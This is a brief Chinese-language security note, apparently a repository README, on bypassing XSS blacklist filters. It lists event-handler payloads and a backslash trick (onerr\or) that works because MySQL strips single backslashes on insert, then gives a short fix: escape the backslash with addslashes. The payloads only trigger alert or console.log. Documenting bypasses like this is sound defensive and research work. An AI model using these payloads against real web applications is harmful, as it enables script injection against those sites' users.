# OnceXssBypass

一次XSS绕过以前的疏忽  
绕过,黑名单绕过:  

    <body onhashchange=alert(/xss/)><a href=#>Me</a>  
    <video src="http://www.w3school.com.cn/i/movie.ogg" oncanplay="alert(1)">  
    <input type="text" AUTOFOCUS onfocus=alert(1)>  
      ...... 

  
万能绕过:  

      <img src=1 onerr\or=console.log(1)>  
      <img src=1 onerr\or=a\lert(1)>

当传入的\字符串只要不组成\t \n这种特定符号的时候，输出的时候不会造成JS或者HTML语意错误  

SQL:  
INSERT INTO faq (`name`,`content`) VALUES ('Help','\Fx\xaa');  
结果:  
name ==> Help  
content ==> Fxxaa  

SQL:  
INSERT INTO faq (`name`,`content`) VALUES ('Help','\\Fx\\xaa');  
结果:  
name ==> Help  
content ==> \Fx\xaa  

因此，造成了XSS漏洞绕过    

修复方法：针对下面的这个SQL插入  
转义\符号  
addslashes会造成绕过失效  
